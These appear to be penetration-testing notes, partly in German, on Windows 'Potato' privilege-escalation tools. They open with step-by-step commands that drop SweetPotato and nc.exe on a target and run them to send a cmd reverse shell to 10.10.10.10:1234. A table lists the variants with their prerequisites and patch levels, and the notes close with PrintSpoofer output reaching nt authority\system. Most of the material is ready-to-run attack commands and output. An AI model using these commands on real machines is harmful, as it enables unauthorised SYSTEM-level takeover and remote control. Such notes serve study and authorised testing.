1. Load SweetPotato and nc.exe to the target.
2. Run it with the “-e EfsRpc” argument (e.g. `.\SweetPotato.exe -e EfsRpc -p c:\Users\Public\nc.exe -a "10.10.10.10 1234 -e cmd"`)
3. Profit.

| Variante                | Startrechte / Voraussetzungen                                | **SeImpersonatePrivilege** nötig | Patch bzw. ab Windows-Version behoben*      |
| ----------------------- | ------------------------------------------------------------ | -------------------------------- | ------------------------------------------- |
| **RottenPotato**        | Lokaler Zugriff + Token-Impersonation                        | Ja                               | Win10 v1709 / Server 2016, 2017 Updates     |
| **JuicyPotato**         | Lokaler Benutzer mit SeImpersonatePrivilege                  | Ja                               | Win10 v1809+, 2019 Updates                  |
| **SweetPotato**         | Wie Juicy, für neuere CLSIDs                                 | Ja                               | Win10 v20H2 / Server 2019, 2021 Updates     |
| **RoguePotato**         | Lokaler Benutzer, Netzwerkzugang                             | Ja                               | Win10 v21H1 / Server 2022, 2021 Updates     |
| **RemotePotato0**       | Lokaler Benutzer, NTLM-Relay über DCOM/HTTP                  | Nein                             | Patchwelle 2021–2022                        |
| **PrintSpoofer**        | Benutzer mit Druckspoolerzugriff                             | Ja                               | Juli 2021 Print Spooler Patch               |
| **GodPotato**           | Lokaler Benutzer mit SeImpersonate oder SeAssignPrimaryToken | Ja/teilweise                     | Win10 22H2 / Server 2022, Ende 2022 Updates |
| **BadPotato / Potato4** | Kleinere Anpassungen für bestimmte Builds                    | Ja                               | Gleiches Patchniveau wie Juicy/Sweet        |
C:\TOOLS>PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.19613.1000]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
nt authority\system